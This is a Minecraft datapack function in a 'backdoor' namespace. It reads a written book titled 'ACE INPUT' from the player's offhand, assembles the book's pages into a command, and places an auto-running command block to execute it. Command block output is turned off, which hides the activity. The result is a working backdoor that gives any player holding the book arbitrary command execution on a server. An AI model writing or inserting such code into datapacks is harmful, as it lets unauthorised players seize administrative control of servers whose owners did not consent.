gamerule commandBlockOutput false
execute unless data entity @s Inventory[{Slot:-106b}].components."minecraft:written_book_content".title{raw:"ACE INPUT"} run return 0
execute store result score count backdoor.temp run data get entity @s Inventory[{Slot:-106b}].components.minecraft:written_book_content.pages
data modify storage backdoor:temp pages set from entity @s Inventory[{Slot:-106b}].components.minecraft:written_book_content.pages

data modify storage backdoor:temp page1_temp set from storage backdoor:temp pages[0].raw
function backdoor:remove_quotes1_init with storage backdoor:temp

function backdoor:recursive_combine
execute align xyz run summon item_display ~0.5 ~0.5 ~0.5 {Tags:["backdoor.block"]}
execute as @n[tag=backdoor.block] at @s run loot replace entity @n[tag=backdoor.block] contents loot blockstate:get
execute as @n[tag=backdoor.block] unless data entity @s item.components."minecraft:custom_data".Properties run data modify entity @s item.components."minecraft:custom_data".Properties set value ''
setblock ~ ~ ~ command_block
data modify block ~ ~ ~ Command set from storage backdoor:temp final_command
data modify block ~ ~ ~ auto set value 1b
item replace entity @s weapon.offhand with writable_book
